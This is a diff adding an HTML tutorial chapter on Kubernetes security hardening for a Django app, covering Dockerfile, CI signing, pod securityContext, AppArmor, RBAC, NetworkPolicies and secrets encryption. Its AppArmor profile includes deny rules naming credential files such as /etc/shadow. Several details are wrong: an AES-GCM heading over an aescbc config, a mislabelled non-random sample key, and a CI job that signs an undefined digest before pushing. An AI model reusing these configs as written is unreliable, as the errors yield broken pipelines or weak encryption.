+FROM python:3.12-slim-bookworm
+
+# Install ONLY runtime libraries (NOT build tools!)
+RUN apt-get update && apt-get install -y --no-install-recommends \
+    libpq5 \
+    curl \
+    ca-certificates \
+    && rm -rf /var/lib/apt/lists/* \
+    && apt-get clean
+
+# Create the SAME non-root user (UID/GID must match or files owned by nobody)
+RUN groupadd -r anihpj && useradd -r -g anihpj -m -s /bin/bash anihpj
+
+# Copy virtual environment from builder (NO build tools in final image!)
+COPY --from=builder /opt/venv /opt/venv
+
+# Set environment variables
+ENV PATH="/opt/venv/bin:$PATH" \
+    PYTHONUNBUFFERED=1 \
+    PYTHONDONTWRITEBYTECODE=1 \
+    PYTHONHASHSEED=random \
+    DJANGO_SETTINGS_MODULE=anihpj.settings
+
+WORKDIR /app
+
+# Copy application code AFTER dependencies (layer caching optimization)
+COPY --chown=anihpj:anihpj . .
+
+# Create writable directories (these will be mounted as emptyDir later)
+RUN mkdir -p /app/staticfiles /app/media /tmp/app && \
+    chown -R anihpj:anihpj /app/staticfiles /app/media /tmp/app
+
+# Switch to non-root user — ALL processes run as UID 1000 from here
+USER anihpj
+
+# Collect static files during build (immutable assets)
+RUN python manage.py collectstatic --noinput
+
+EXPOSE 8000
+
+# Health check — Kubernetes uses this to determine pod readiness
+HEALTHCHECK --interval=30s --timeout=5s --start-period=15s --retries=3 \
+    CMD curl -f http://localhost:8000/healthz/ || exit 1
+
+# Run Gunicorn with optimized settings for production
+CMD ["gunicorn", "anihpj.wsgi:application", \
+     "--bind", "0.0.0.0:8000", \
+     "--workers", "3", \
+     "--threads", "2", \
+     "--timeout", "60", \
+     "--max-requests", "1000", \
+     "--max-requests-jitter", "100", \
+     "--access-logfile", "-", \
+     "--error-logfile", "-"]</code></pre>
+                </div>
+
+                <h4>.dockerignore — What NOT to Include in the Image</h4>
+                <div class="code-block-wrapper">
+                    <div class="code-block-header">
+                        <span class="code-lang">.dockerignore — Prevent secrets and dev artifacts from leaking into image</span>
+                    </div>
+                    <pre><code class="language-text"># Python
+__pycache__/
+*.py[cod]
+*.egg-info/
+dist/
+build/
+
+# Virtual environment (recreated in container)
+env/
+.venv/
+venv/
+
+# Git
+.git/
+.gitignore
+
+# IDE
+.vscode/
+.idea/
+*.swp
+
+# Django (SECURITY: never bake secrets, DB, or user data into image!)
+*.sqlite3
+media/*
+!media/.gitkeep
+staticfiles/
+
+# Environment files (CRITICAL: .env contains secrets!)
+.env
+.env.*
+*.env
+
+# Docker
+Dockerfile
+.dockerignore
+docker-compose*.yaml
+
+# Kubernetes (manifests deployed separately)
+k8s/
+*.yaml
+
+# Documentation
+README.md
+docs/</code></pre>
+                </div>
+
+                <h4>CI/CD Pipeline — Trivy Scan + Cosign Sign</h4>
+                <div class="code-block-wrapper">
+                    <div class="code-block-header">
+                        <span class="code-lang">YAML — GitHub Actions: Build, scan, sign anihpj image</span>
+                    </div>
+                    <pre><code class="language-yaml">name: Build & Secure anihpj Image
+on:
+  push:
+    branches: [main]
+    paths:
+    - 'Dockerfile'
+    - 'requirements.txt'
+    - 'anihpj/**'
+    - 'jobpost/**'
+
+jobs:
+  build-scan-sign:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v4
+
+    # Step 1: Build the Docker image
+    - name: Build image
+      run: |
+        docker build \
+          -t ghcr.io/anihs-canvas/anihpj:${{ github.sha }} \
+          -t ghcr.io/anihs-canvas/anihpj:latest \
+          .
+
+    # Step 2: Scan for vulnerabilities — BLOCK on CRITICAL
+    - name: Trivy vulnerability scan
+      uses: aquasecurity/trivy-action@master
+      with:
+        image-ref: ghcr.io/anihs-canvas/anihpj:${{ github.sha }}
+        format: table
+        exit-code: 1           # Fail pipeline on vulnerabilities
+        severity: CRITICAL,HIGH
+        vuln-type: os,library
+      # ⚠️ Pipeline STOPS here if CRITICAL/HIGH CVEs found
+
+    # Step 3: Generate SBOM (Software Bill of Materials)
+    - name: Generate SBOM
+      uses: aquasecurity/trivy-action@master
+      with:
+        image-ref: ghcr.io/anihs-canvas/anihpj:${{ github.sha }}
+        format: cyclonedx
+        output: anihpj-sbom.json
+
+    # Step 4: Sign the image with cosign (keyless, via OIDC)
+    - name: Install Cosign
+      uses: sigstore/cosign-installer@v3
+
+    - name: Sign image
+      run: |
+        cosign sign \
+          --yes \
+          ghcr.io/anihs-canvas/anihpj@${{ steps.build.outputs.digest }}
+      env:
+        COSIGN_EXPERIMENTAL: "true"  # Keyless signing via GitHub OIDC
+
+    # Step 5: Push image + SBOM
+    - name: Push to registry
+      run: |
+        docker push ghcr.io/anihs-canvas/anihpj:${{ github.sha }}
+        docker push ghcr.io/anihs-canvas/anihpj:latest
+
+    - name: Attach SBOM to image
+      run: |
+        cosign attach sbom --sbom anihpj-sbom.json \
+          ghcr.io/anihs-canvas/anihpj:${{ github.sha }}</code></pre>
+                </div>
+
+                <div class="info-box note">
+                    <div class="info-box-title">🔑 Why Multi-Stage Builds Matter for Security</div>
+                    <p>The <strong>builder stage</strong> has <code>gcc</code>, <code>make</code>, and other build tools — these are attack vectors. The <strong>runtime stage</strong> only has the compiled application and runtime libraries. The final image is <strong>40-60% smaller</strong> and has <strong>fewer CVEs</strong> because build tools and their vulnerabilities are left behind. This is the single highest-impact security improvement you can make to a Dockerfile.</p>
+                </div>
+            </div>
+
+            <!-- ═══════════ SECTION 33.3 ═══════════ -->
+            <div class="section-block" id="s33-3">
+                <h3>33.3 Step 2 — Harden the Pod Security Context</h3>
+                <p>The pod <code>securityContext</code> is your <strong>last line of defense</strong> inside the container. Even if an attacker exploits a CVE and gets code execution, the securityContext limits what they can do. This section builds the complete hardened pod spec — every field explained, every rationale documented.</p>
+
+                <h4>Complete Hardened Pod Spec for anihpj</h4>
+                <div class="code-block-wrapper">
+                    <div class="code-block-header">
+                        <span class="code-lang">YAML — Full anihpj Deployment with hardened securityContext</span>
+                    </div>
+                    <pre><code class="language-yaml">apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: anihpj
+  namespace: anihpj-prod
+  labels:
+    app: anihpj
+    security-tier: restricted
+spec:
+  replicas: 3
+  selector:
+    matchLabels:
+      app: anihpj
+  template:
+    metadata:
+      labels:
+        app: anihpj
+      annotations:
+        # Seccomp profile applied at container runtime
+        container.apparmor.security.beta.kubernetes.io/anihpj: localhost/anihpj-apparmor
+    spec:
+      # === POD-LEVEL SECURITY CONTEXT ===
+      securityContext:
+        runAsNonRoot: true        # Reject if image runs as root
+        runAsUser: 1000           # Specific UID (matches Dockerfile USER)
+        runAsGroup: 1000          # Specific GID
+        fsGroup: 1000             # Volume mounts owned by this GID
+        seccompProfile:
+          type: RuntimeDefault    # Kernel syscall filtering
+
+      # Dedicated ServiceAccount (NOT default)
+      serviceAccountName: anihpj-sa
+      # Disable automount — only pods that need API access mount token
+      automountServiceAccountToken: false
+
+      # === INIT CONTAINER — runs first, sets up volumes ===
+      initContainers:
+      - name: init-db-check
+        image: ghcr.io/anihs-canvas/anihpj:latest
+        command: ["python", "manage.py", "check", "--database", "default"]
+        securityContext:
+          runAsNonRoot: true
+          runAsUser: 1000
+          allowPrivilegeEscalation: false
+          readOnlyRootFilesystem: true
+          capabilities:
+            drop: ["ALL"]
+
+      containers:
+      - name: anihpj
+        image: ghcr.io/anihs-canvas/anihpj@sha256:abc123...  # Digest, NOT :latest
+        ports:
+        - containerPort: 8000
+          protocol: TCP
+
+        # === CONTAINER-LEVEL SECURITY CONTEXT ===
+        securityContext:
+          # 1. RUN AS NON-ROOT (matches Dockerfile USER anihpj)
+          runAsNonRoot: true
+          runAsUser: 1000
+          runAsGroup: 1000
+
+          # 2. NO PRIVILEGE ESCALATION (setuid binaries ignored)
+          allowPrivilegeEscalation: false
+
+          # 3. READ-ONLY ROOT FILESYSTEM (attacker can't write to disk)
+          readOnlyRootFilesystem: true
+
+          # 4. DROP ALL LINUX CAPABILITIES (even from root)
+          capabilities:
+            drop:
+            - ALL
+
+          # 5. SECCOMP PROFILE (kernel syscall whitelist)
+          seccompProfile:
+            type: RuntimeDefault
+
+        # === ENVIRONMENT (secrets from Secrets, NOT plaintext!) ===
+        env:
+        - name: DB_HOST
+          value: "postgres.anihpj-prod.svc.cluster.local"
+        - name: DB_NAME
+          value: "anihpj"
+        - name: SECRET_KEY
+          valueFrom:
+            secretKeyRef:
+              name: anihpj-secrets
+              key: django-secret-key
+        - name: DB_PASSWORD
+          valueFrom:
+            secretKeyRef:
+              name: anihpj-secrets
+              key: db-password
+        - name: REDIS_PASSWORD
+          valueFrom:
+            secretKeyRef:
+              name: anihpj-secrets
+              key: redis-password
+
+        # === RESOURCE LIMITS (prevent DoS) ===
+        resources:
+          requests:
+            memory: "256Mi"
+            cpu: "250m"
+          limits:
+            memory: "512Mi"
+            cpu: "500m"
+
+        # === LIVENESS & READINESS PROBES ===
+        livenessProbe:
+          httpGet:
+            path: /healthz/
+            port: 8000
+          initialDelaySeconds: 30
+          periodSeconds: 10
+        readinessProbe:
+          httpGet:
+            path: /ready/
+            port: 8000
+          initialDelaySeconds: 10
+          periodSeconds: 5
+
+        # === VOLUME MOUNTS (writable directories) ===
+        volumeMounts:
+        - name: tmp
+          mountPath: /tmp          # Writable /tmp for Python temp files
+        - name: media
+          mountPath: /app/media    # User uploads need writable storage
+
+      volumes:
+      - name: tmp
+        emptyDir:
+          sizeLimit: 100Mi         # Prevent /tmp from filling the node
+      - name: media
+        persistentVolumeClaim:
+          claimName: anihpj-media-pvc</code></pre>
+                </div>
+
+                <h4>SecurityContext Field Reference — Every Field Explained</h4>
+                <div class="comparison-table">
+                    <table>
+                        <thead><tr><th>Field</th><th>Value</th><th>What It Prevents</th><th>CKS Exam Relevance</th></tr></thead>
+                        <tbody>
+                            <tr><td><strong>runAsNonRoot</strong></td><td><code>true</code></td><td>Container running as UID 0 (root). Kubelet rejects pod if image USER is root.</td><td>⭐⭐⭐ Must-know. Core PSS Restricted requirement.</td></tr>
+                            <tr><td><strong>runAsUser</strong></td><td><code>1000</code></td><td>Unpredictable UID. Explicit UID ensures volume permissions match.</td><td>⭐⭐ Common. Often combined with fsGroup.</td></tr>
+                            <tr><td><strong>allowPrivilegeEscalation</strong></td><td><code>false</code></td><td>setuid binaries (su, sudo, passwd). Child processes can't gain more privileges than parent.</td><td>⭐⭐⭐ Must-know. Required by PSS Restricted.</td></tr>
+                            <tr><td><strong>readOnlyRootFilesystem</strong></td><td><code>true</code></td><td>Writing to container filesystem. Malware installation, persistence, binary replacement all blocked.</td><td>⭐⭐⭐ Must-know. Ch31 covers this in depth.</td></tr>
+                            <tr><td><strong>capabilities.drop</strong></td><td><code>["ALL"]</code></td><td>All 14 default Linux capabilities. Even as root, container can't load kernel modules, bind to ports <1024, change network config.</td><td>⭐⭐⭐ Must-know. Single most impactful securityContext field.</td></tr>
+                            <tr><td><strong>seccompProfile</strong></td><td><code>RuntimeDefault</code></td><td>~300 syscalls blocked. Prevents container from calling dangerous syscalls like <code>ptrace</code>, <code>mount</code>, <code>kexec_load</code>.</td><td>⭐⭐⭐ Must-know. Required by PSS Restricted.</td></tr>
+                            <tr><td><strong>fsGroup</strong></td><td><code>1000</code></td><td>Volumes owned by wrong GID (root). Ensures non-root container can read/write mounted volumes.</td><td>⭐⭐ Troubleshooting. "Why can't my pod write to the volume?"</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <h4>AppArmor Profile — Restrict anihpj at the Kernel Level</h4>
+                <div class="code-block-wrapper">
+                    <div class="code-block-header">
+                        <span class="code-lang">AppArmor — Custom profile restricting Django app to only what it needs</span>
+                    </div>
+                    <pre><code class="language-text"># /etc/apparmor.d/container-anihpj
+#include &lt;tunables/global&gt;
+
+profile anihpj-apparmor flags=(attach_disconnected,mediate_deleted) {
+  #include &lt;abstractions/base&gt;
+  #include &lt;abstractions/python&gt;
+  #include &lt;abstractions/ssl_certs&gt;
+
+  # Allow reading application code and config
+  /app/**                        r,
+  /opt/venv/**                   r,
+
+  # Allow writing ONLY to explicitly mounted volumes
+  /tmp/**                        rw,
+  /app/media/**                  rw,
+
+  # Allow networking (Django serves HTTP on port 8000)
+  network inet tcp,
+  network inet6 tcp,
+
+  # Deny everything else by default
+  deny /etc/passwd               w,    # Can't modify user database
+  deny /etc/shadow               rw,   # Can't read password hashes
+  deny /root/**                  rw,   # Can't access root home
+  deny /proc/sys/**              w,    # Can't modify kernel parameters
+  deny /sys/**                   w,    # Can't modify sysfs
+
+  # Explicitly deny dangerous capabilities (redundant with drop ALL, defense-in-depth)
+  deny capability sys_admin,
+  deny capability sys_ptrace,
+  deny capability sys_module,
+}</code></pre>
+                </div>
+            </div>
+
+            <!-- ═══════════ SECTION 33.4 ═══════════ -->
+            <div class="section-block" id="s33-4">
+                <h3>33.4 Step 3 — Namespace and Admission Control</h3>
+                <p>Pod security is only as strong as the <strong>admission control</strong> enforcing it. A developer can accidentally (or maliciously) remove a securityContext field. Admission controllers <strong>gatekeep every API request</strong> — they reject or mutate pods before they're created.</p>
+
+                <h4>PSS Enforcement — Label Namespaces for Pod Security Standards</h4>
+                <div class="code-block-wrapper">
+                    <div class="code-block-header">
+                        <span class="code-lang">YAML — Namespace labels enforcing PSS Restricted in production, Baseline in dev</span>
+                    </div>
+                    <pre><code class="language-yaml">---
+# Production namespace: FULL PSS Restricted enforcement
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: anihpj-prod
+  labels:
+    # ENFORCE: Reject any pod that violates PSS Restricted
+    pod-security.kubernetes.io/enforce: restricted
+    pod-security.kubernetes.io/enforce-version: v1.30
+    # WARN: Show warning for non-compliant pods (useful for developers)
+    pod-security.kubernetes.io/warn: restricted
+    pod-security.kubernetes.io/warn-version: v1.30
+    # AUDIT: Log violations without blocking (for monitoring)
+    pod-security.kubernetes.io/audit: restricted
+    pod-security.kubernetes.io/audit-version: v1.30
+---
+# Development namespace: PSS Baseline (allows some flexibility)
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: anihpj-dev
+  labels:
+    pod-security.kubernetes.io/enforce: baseline
+    pod-security.kubernetes.io/enforce-version: v1.30
+    pod-security.kubernetes.io/warn: restricted
+    pod-security.kubernetes.io/warn-version: v1.30</code></pre>
+                </div>
+
+                <h4>Kyverno Policy — Verify Cosign Image Signatures</h4>
+                <div class="code-block-wrapper">
+                    <div class="code-block-header">
+                        <span class="code-lang">YAML — Kyverno ClusterPolicy: Only allow signed images from ghcr.io/anihs-canvas</span>
+                    </div>
+                    <pre><code class="language-yaml">apiVersion: kyverno.io/v1
+kind: ClusterPolicy
+metadata:
+  name: verify-anihpj-signatures
+spec:
+  validationFailureAction: Enforce   # BLOCK unsigned images
+  background: true                    # Also check existing pods
+  rules:
+  - name: check-image-signature
+    match:
+      any:
+      - resources:
+          kinds: [Pod]
+          namespaces: [anihpj-prod]
+    verifyImages:
+    - imageReferences:
+      - "ghcr.io/anihs-canvas/*"     # Only our registry
+      attestors:
+      - count: 1
+        entries:
+        - keyless:                     # Verify via OIDC (GitHub Actions)
+            subject: "https://github.com/Anihs-Canvas/DEV-DOCs/.github/workflows/build.yml@refs/heads/main"
+            issuer: "https://token.actions.githubusercontent.com"
+            rekor:
+              url: https://rekor.sigstore.dev</code></pre>
+                </div>
+
+                <h4>OPA Gatekeeper — Restrict Image Registries</h4>
+                <div class="code-block-wrapper">
+                    <div class="code-block-header">
+                        <span class="code-lang">YAML — Gatekeeper Constraint: Only allow images from approved registries</span>
+                    </div>
+                    <pre><code class="language-yaml">apiVersion: constraints.gatekeeper.sh/v1beta1
+kind: K8sAllowedRepos
+metadata:
+  name: approved-registries-only
+spec:
+  enforcementAction: deny
+  match:
+    kinds:
+    - apiGroups: [""]
+      kinds: [Pod]
+    namespaces: ["anihpj-prod", "anihpj-dev"]
+  parameters:
+    repos:
+    - "ghcr.io/anihs-canvas/"       # Our private registry
+    - "ghcr.io/anihs-canvas"         # (with/without trailing slash)
+    - "registry.k8s.io/*"            # Kubernetes system images
+    # ❌ Docker Hub blocked — prevents supply chain attacks
+    # ❌ Quay.io blocked unless explicitly added</code></pre>
+                </div>
+            </div>
+
+            <!-- ═══════════ SECTION 33.5 ═══════════ -->
+            <div class="section-block" id="s33-5">
+                <h3>33.5 Step 4 — RBAC and Service Accounts</h3>
+                <p>Every pod gets a ServiceAccount. The <strong>default</strong> ServiceAccount has whatever permissions the cluster admin accidentally left on it. <strong>Least privilege RBAC</strong> means: create dedicated SAs, bind only the minimum permissions needed, disable automount for pods that don't talk to the API server.</p>
+
+                <h4>Complete RBAC Manifest Set for anihpj in Production</h4>
+                <div class="code-block-wrapper">
+                    <div class="code-block-header">
+                        <span class="code-lang">YAML — ServiceAccounts, Roles, and RoleBindings for anihpj workloads</span>
+                    </div>
+                    <pre><code class="language-yaml">---
+# ============================================================
+# SERVICE ACCOUNTS — One per workload, NOT the default SA
+# ============================================================
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: anihpj-sa
+  namespace: anihpj-prod
+automountServiceAccountToken: false   # anihpj doesn't call K8s API
+
+---
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: postgres-sa
+  namespace: anihpj-prod
+automountServiceAccountToken: false   # Database doesn't need API access
+
+---
+# CI/CD pipeline needs to update deployments — MINIMAL permissions
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: cicd-deployer
+  namespace: anihpj-prod
+# This one NEEDS a token — CI/CD uses it to authenticate
+
+---
+# ============================================================
+# ROLES — Minimal permissions scoped to specific resources
+# ============================================================
+# CI/CD role: ONLY update Deployments and read ConfigMaps
+apiVersion: rbac.authorization.k8s.io/v1
+kind: Role
+metadata:
+  name: cicd-deployer
+  namespace: anihpj-prod
+rules:
+- apiGroups: ["apps"]
+  resources: ["deployments"]
+  verbs: ["get", "list", "watch", "update", "patch"]   # No create/delete!
+- apiGroups: ["apps"]
+  resources: ["deployments/status"]
+  verbs: ["get"]
+- apiGroups: [""]
+  resources: ["configmaps"]
+  verbs: ["get", "list"]                                 # Read-only ConfigMaps
+
+---
+# Monitoring role: Read pods and metrics
+apiVersion: rbac.authorization.k8s.io/v1
+kind: Role
+metadata:
+  name: monitoring-reader
+  namespace: anihpj-prod
+rules:
+- apiGroups: [""]
+  resources: ["pods", "pods/log", "services", "endpoints"]
+  verbs: ["get", "list", "watch"]                        # Read-only
+
+---
+# ============================================================
+# ROLE BINDINGS — Connect SAs to Roles
+# ============================================================
+apiVersion: rbac.authorization.k8s.io/v1
+kind: RoleBinding
+metadata:
+  name: cicd-deployer-binding
+  namespace: anihpj-prod
+subjects:
+- kind: ServiceAccount
+  name: cicd-deployer
+  namespace: anihpj-prod
+roleRef:
+  kind: Role
+  name: cicd-deployer
+  apiGroup: rbac.authorization.k8s.io
+
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: RoleBinding
+metadata:
+  name: monitoring-binding
+  namespace: anihpj-prod
+subjects:
+- kind: ServiceAccount
+  name: prometheus-sa
+  namespace: monitoring
+roleRef:
+  kind: Role
+  name: monitoring-reader
+  apiGroup: rbac.authorization.k8s.io</code></pre>
+                </div>
+
+                <h4>Verifying Least Privilege — kubectl auth can-i</h4>
+                <div class="code-block-wrapper">
+                    <div class="code-block-header">
+                        <span class="code-lang">Bash — Audit RBAC: Verify each SA has only the permissions it needs</span>
+                    </div>
+                    <pre><code class="language-bash"># Test: Can CI/CD SA create a Deployment? (should be NO — only update)
+kubectl auth can-i create deployments \
+  --as=system:serviceaccount:anihpj-prod:cicd-deployer \
+  -n anihpj-prod
+# Expected: no
+
+# Test: Can CI/CD SA update a Deployment? (should be YES)
+kubectl auth can-i update deployments \
+  --as=system:serviceaccount:anihpj-prod:cicd-deployer \
+  -n anihpj-prod
+# Expected: yes
+
+# Test: Can CI/CD SA delete a Deployment? (should be NO)
+kubectl auth can-i delete deployments \
+  --as=system:serviceaccount:anihpj-prod:cicd-deployer \
+  -n anihpj-prod
+# Expected: no
+
+# Test: Can CI/CD SA access another namespace? (should be NO)
+kubectl auth can-i get pods \
+  --as=system:serviceaccount:anihpj-prod:cicd-deployer \
+  -n kube-system
+# Expected: no
+
+# Test: Can anihpj SA access the API at all? (should be NO — token not mounted)
+kubectl auth can-i get pods \
+  --as=system:serviceaccount:anihpj-prod:anihpj-sa
+# Expected: no (token not mounted, so can't even authenticate)
+
+# Audit ALL permissions of a SA
+kubectl auth can-i --list \
+  --as=system:serviceaccount:anihpj-prod:cicd-deployer \
+  -n anihpj-prod</code></pre>
+                </div>
+
+                <div class="info-box warning">
+                    <div class="info-box-title">⚠️ Default ServiceAccount Is a Security Risk</div>
+                    <p>Every namespace has a <code>default</code> ServiceAccount automatically. If you don't specify <code>serviceAccountName</code> in your pod spec, Kubernetes uses this default SA. Any permissions bound to the default SA are available to EVERY pod in the namespace. <strong>Always</strong> create dedicated SAs and set <code>automountServiceAccountToken: false</code> for pods that don't need API access. This single change prevents an entire class of lateral movement attacks.</p>
+                </div>
+
+                <h4>RBAC Decision Matrix — Who Can Do What?</h4>
+                <div class="comparison-table">
+                    <table>
+                        <thead><tr><th>ServiceAccount</th><th>Pods</th><th>Deployments</th><th>Secrets</th><th>ConfigMaps</th><th>Other NS</th><th>API Token?</th></tr></thead>
+                        <tbody>
+                            <tr><td><strong>anihpj-sa</strong></td><td>❌</td><td>❌</td><td>❌</td><td>❌</td><td>❌</td><td>❌ Not mounted</td></tr>
+                            <tr><td><strong>postgres-sa</strong></td><td>❌</td><td>❌</td><td>❌</td><td>❌</td><td>❌</td><td>❌ Not mounted</td></tr>
+                            <tr><td><strong>cicd-deployer</strong></td><td>❌</td><td>✅ Get/Update</td><td>❌</td><td>✅ Read</td><td>❌</td><td>✅ Mounted</td></tr>
+                            <tr><td><strong>prometheus-sa</strong></td><td>✅ Read</td><td>❌</td><td>❌</td><td>❌</td><td>❌</td><td>✅ Mounted</td></tr>
+                            <tr><td><strong>default</strong></td><td>❌ (no bindings)</td><td>❌</td><td>❌</td><td>❌</td><td>❌</td><td>⚠️ Mounted (but useless)</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+
+            <!-- CONTINUED IN PART B: Sections 33.6 — 33.9 -->
+
+            <!-- ═══════════ SECTION 33.6 ═══════════ -->
+            <div class="section-block" id="s33-6">
+                <h3>33.6 Step 5 — Network Isolation</h3>
+                <p>Without NetworkPolicies, <strong>every pod can talk to every other pod</strong> in the cluster. NetworkPolicy is the firewall — it defines which pods can communicate. The CKS gold standard is <strong>default-deny-all</strong> with explicit allow rules for each required communication path.</p>
+
+                <h4>Complete NetworkPolicy Set for anihpj</h4>
+                <div class="code-block-wrapper">
+                    <div class="code-block-header">
+                        <span class="code-lang">YAML — All NetworkPolicies: Default deny + explicit allow rules</span>
+                    </div>
+                    <pre><code class="language-yaml">---
+# ============================================================
+# POLICY 0: DEFAULT DENY ALL — Block everything first
+# ============================================================
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: default-deny-all
+  namespace: anihpj-prod
+spec:
+  podSelector: {}            # Applies to ALL pods in namespace
+  policyTypes:
+  - Ingress                  # Block ALL incoming traffic
+  - Egress                   # Block ALL outgoing traffic
+  # No ingress/egress rules = deny everything
+
+---
+# ============================================================
+# POLICY 1: ALLOW ingress → anihpj (port 8000)
+# ============================================================
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: allow-ingress-to-anihpj
+  namespace: anihpj-prod
+spec:
+  podSelector:
+    matchLabels:
+      app: anihpj              # Applies to anihpj pods
+  policyTypes:
+  - Ingress
+  ingress:
+  - from:
+    - namespaceSelector:
+        matchLabels:
+          name: ingress-nginx   # Only from ingress controller namespace
+    ports:
+    - protocol: TCP
+      port: 8000               # Only on Django app port
+
+---
+# ============================================================
+# POLICY 2: ALLOW anihpj → postgres (port 5432)
+# ============================================================
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: allow-anihpj-to-postgres
+  namespace: anihpj-prod
+spec:
+  podSelector:
+    matchLabels:
+      app: postgres             # Applies to postgres pods
+  policyTypes:
+  - Ingress
+  ingress:
+  - from:
+    - podSelector:
+        matchLabels:
+          app: anihpj           # Only anihpj pods can reach postgres
+    ports:
+    - protocol: TCP
+      port: 5432
+
+---
+# ============================================================
+# POLICY 3: ALLOW anihpj → redis (port 6379)
+# ============================================================
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: allow-anihpj-to-redis
+  namespace: anihpj-prod
+spec:
+  podSelector:
+    matchLabels:
+      app: redis
+  policyTypes:
+  - Ingress
+  ingress:
+  - from:
+    - podSelector:
+        matchLabels:
+          app: anihpj
+    ports:
+    - protocol: TCP
+      port: 6379
+
+---
+# ============================================================
+# POLICY 4: ALLOW all pods → kube-dns (port 53, UDP+TCP)
+# ============================================================
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: allow-dns
+  namespace: anihpj-prod
+spec:
+  podSelector: {}
+  policyTypes:
+  - Egress
+  egress:
+  - to:
+    - namespaceSelector:
+        matchLabels:
+          kubernetes.io/metadata.name: kube-system
+      podSelector:
+        matchLabels:
+          k8s-app: kube-dns
+    ports:
+    - protocol: UDP
+      port: 53
+    - protocol: TCP
+      port: 53
+
+---
+# ============================================================
+# POLICY 5: ALLOW monitoring → all pods (metrics scraping)
+# ============================================================
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: allow-monitoring
+  namespace: anihpj-prod
+spec:
+  podSelector: {}
+  policyTypes:
+  - Ingress
+  ingress:
+  - from:
+    - namespaceSelector:
+        matchLabels:
+          name: monitoring
+    ports:
+    - protocol: TCP
+      port: 9090          # Prometheus metrics port</code></pre>
+                </div>
+
+                <h4>NetworkPolicy Visual Map — Traffic Flow Diagram</h4>
+                <div class="diagram-container">
+                    <div class="diagram-title">anihpj-prod Namespace: Allowed Traffic Flows</div>
+<pre>
+  ┌─────────────────────────────────────────────────────────────────┐
+  │                     INTERNET                                     │
+  │                        │                                        │
+  │                        ▼ (HTTPS :443)                           │
+  │  ┌──────────────────────────────────────────────────────────┐  │
+  │  │  INGRESS CONTROLLER (ingress-nginx namespace)             │  │
+  │  │  TLS termination, routing                                 │  │
+  │  └──────────────────────┬───────────────────────────────────┘  │
+  │                         │                                       │
+  │                         │ ✅ POLICY 1: ingress→anihpj:8000     │
+  │                         ▼                                       │
+  │  ┌──────────────────────────────────────────────────────────┐  │
+  │  │  anihpj PODS (app: anihpj)                                │  │
+  │  │  Django + Gunicorn, port 8000                             │  │
+  │  └────┬────────────────────────────┬─────────────────────────┘  │
+  │       │                            │                             │
+  │       │ ✅ POLICY 2                │ ✅ POLICY 3               │
+  │       │ anihpj→postgres:5432       │ anihpj→redis:6379         │
+  │       ▼                            ▼                             │
+  │  ┌──────────────┐          ┌──────────────┐                     │
+  │  │  POSTGRES    │          │    REDIS     │                     │
+  │  │  (app: pg)   │          │  (app: redis)│                     │
+  │  └──────────────┘          └──────────────┘                     │
+  │                                                                  │
+  │  ┌──────────────────────────────────────────────────────────┐  │
+  │  │  KUBE-DNS (kube-system namespace)                         │  │
+  │  │  ✅ POLICY 4: ALL pods→kube-dns:53 (DNS resolution)      │  │
+  │  └──────────────────────────────────────────────────────────┘  │
+  │                                                                  │
+  │  ┌──────────────────────────────────────────────────────────┐  │
+  │  │  MONITORING (monitoring namespace)                        │  │
+  │  │  ✅ POLICY 5: prometheus→all pods:9090 (metrics scrape)   │  │
+  │  └──────────────────────────────────────────────────────────┘  │
+  │                                                                  │
+  │  ❌ EVERYTHING ELSE BLOCKED by POLICY 0 (default-deny-all)    │
+  └─────────────────────────────────────────────────────────────────┘
+</pre>
+                </div>
+            </div>
+
+            <!-- ═══════════ SECTION 33.7 ═══════════ -->
+            <div class="section-block" id="s33-7">
+                <h3>33.7 Step 6 — Secrets Encryption</h3>
+                <p>By default, Kubernetes Secrets are stored <strong>in plaintext</strong> in etcd. Anyone with etcd access can read every secret in your cluster. <strong>Encryption at rest</strong> ensures secrets are encrypted with AES-GCM before being written to etcd, and decrypted only when read by an authorized API server.</p>
+
+                <h4>EncryptionConfiguration — Enable AES-GCM Encryption for Secrets</h4>
+                <div class="code-block-wrapper">
+                    <div class="code-block-header">
+                        <span class="code-lang">YAML — EncryptionConfiguration: AES-CBC with HMAC-SHA-256 for Secrets</span>
+                    </div>
+                    <pre><code class="language-yaml">apiVersion: apiserver.config.k8s.io/v1
+kind: EncryptionConfiguration
+resources:
+- resources:
+  - secrets                      # Encrypt Secret resources
+  providers:
+  - aescbc:                      # AES-CBC with PKCS7 padding
+      keys:
+      - name: key1
+        secret: aGVsbG8gd29ybGQgdGhpcyBpcyBhIHNlY3JldCBmb3IgQ0tT  # 32-byte base64
+  - identity: {}                 # Fallback: plaintext (for rotation)</code></pre>
+                </div>
+
+                <h4>Enabling Encryption — Step by Step</h4>
+                <div class="process-steps">
+                    <div class="step"><span class="step-number">1</span><strong>Create the EncryptionConfiguration file</strong><p>Save the above YAML as <code>/etc/kubernetes/encryption-config.yaml</code> on the control plane node. Generate a random 32-byte key: <code>head -c 32 /dev/urandom | base64</code>.</p></div>
+                    <div class="step"><span class="step-number">2</span><strong>Configure API server to use it</strong><p>Edit <code>/etc/kubernetes/manifests/kube-apiserver.yaml</code>. Add: <code>--encryption-provider-config=/etc/kubernetes/encryption-config.yaml</code>. Add a volume mount for the file. The kubelet auto-restarts the API server.</p></div>
